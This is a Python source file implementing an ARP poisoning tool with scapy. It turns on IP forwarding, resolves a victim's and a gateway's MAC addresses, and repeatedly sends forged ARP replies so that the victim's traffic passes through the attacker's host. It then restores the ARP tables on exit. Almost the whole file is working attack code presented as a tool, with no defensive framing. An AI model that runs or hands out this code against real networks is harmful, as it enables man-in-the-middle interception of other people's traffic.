import os
import sys
import time
from scapy.all import *

class Arp_poison:
        def __init__(self):
                self.run_poison = True
                self.interface = ""
                self.victimIP = ""
                self.gateIP = ""

        def enablePoison(self):
                print("\n[*] Enabling IP Forwarding...\n")
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                poison_thread = threading.Thread(target=self.poison, args=())
                poison_thread.deamon = True
                poison_thread.start()

        def disablePoison(self):
                self.run_poison = False

        def get_mac(self, IP):
                conf.verb = 0
                ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = self.interface, inter = 0.1)
                for snd,rcv in ans:
                        return rcv.sprintf(r"%Ether.src%")
 
        def reARP(self):
                print("\n[*] Restoring Targets...")
                victimMAC = self.get_mac(self.victimIP)
                gateMAC = self.get_mac(self.gateIP)
                send(ARP(op = 2, pdst = self.gateIP, psrc = self.victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
                send(ARP(op = 2, pdst = self.victimIP, psrc = self.gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
                print("[*] Disabling IP Forwarding...")
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                print("[*] Poison Stopped.")
 
        def trick(self, gm, vm):
                send(ARP(op = 2, pdst = self.victimIP, psrc = self.gateIP, hwdst= vm))
                send(ARP(op = 2, pdst = self.gateIP, psrc = self.victimIP, hwdst= gm))

        def poison(self):
                try:
                        victimMAC = self.get_mac(self.victimIP)
                except Exception:
                        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                        print("[!] Couldn't Find Victim MAC Address")
                        print("[!] Exiting...")
                        sys.exit(1)
                try:
                        gateMAC = self.get_mac(self.gateIP)
                except Exception:
                        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                        print("[!] Couldn't Find Gateway MAC Address")
                        print("[!] Exiting...")
                        sys.exit(1)
                print("[*] Poisoning Targets...")

                while self.run_poison:
                        self.trick(gateMAC, victimMAC)
                        time.sleep(1.5)
                self.reARP()